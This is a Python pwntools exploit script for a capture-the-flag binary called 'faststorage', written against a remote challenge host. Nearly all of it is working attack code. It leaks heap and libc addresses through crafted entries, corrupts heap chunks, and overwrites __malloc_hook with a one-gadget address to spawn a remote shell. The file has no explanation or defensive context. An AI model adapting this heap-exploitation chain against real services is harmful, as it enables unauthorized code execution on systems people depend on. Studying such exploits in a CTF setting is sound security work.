from pwn import *
import os
local=0
pc='./faststorage'
pc='/tmp/pwn/faststorage_debug'
remote_addr=['faststorage.hackable.software',1337]
aslr=False
#context.log_level=True
payload=open("payload",'rb').read()
libc=ELF('./libc.so.6')

if local==1:
    p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
    #p = process(pc,aslr=aslr)
    gdb.attach(p,'c')
else:
    p=remote(remote_addr[0],remote_addr[1])

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x) 
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def choice(idx):
    sla("> ",str(idx))

def add_entry(name,size,value):
    choice(1)
    sa(":",name)
    sla(":",str(size))
    sa(":",value)

def edit_entry(name,value):
    choice(3)
    sa(":",name)
    sa(":",value)

def print_entry(name):
    choice(2)
    sa(":",name)

def getcheck(idx):
    global payload
    if idx >= 12:
        return payload[(idx-12)*6:(idx-12)*6+6]
    payloads = os.popen(f"python more.py {str(idx)}").read().strip('\n')
    payloads=payloads.split(' + ')
    return ''.join(p8(int(i)) for i in payloads)

if __name__ == '__main__':
    thename='\xa1\xf8\xe6\xa9'
    a=[]
    for i in range(32):
        a.append(getcheck(12+i))
        add_entry(a[i],0x10,'123')
    add_entry(thename,0x10,'fuckme')
    res=0
    for i in range(32):
        print_entry(a[i])
        if "No such entry!" in rl():
            continue
        res+=1<<(12+i)
    heap_addr=res+0x500000000000
    lg("heap addr",heap_addr)
    pl=p64(0)*1+p64(heap_addr+0xc30)+p64(heap_addr+0xd38+(0x1000<<47))
    add_entry(getcheck(5),0x80,pl)
    edit_entry(thename,p64(0x2d1))
    add_entry('1234',0x300,'1234')
    print_entry(thename)
    ru("Value: ")
    rv(16)
    libc_addr=raddr()-0x3c4e18
    lg("libc_addr",libc_addr)
    libc.address=libc_addr 
    pl=p64(0x21)+'1234\x00\x00\x00\x00'+p64(0)*4+p64(heap_addr+0xd40)+p64(libc.symbols['__malloc_hook']+(0x8<<48))
    edit_entry(thename,pl)
    edit_entry('1234',p64(libc.address+0xf1147))
    p.interactive()
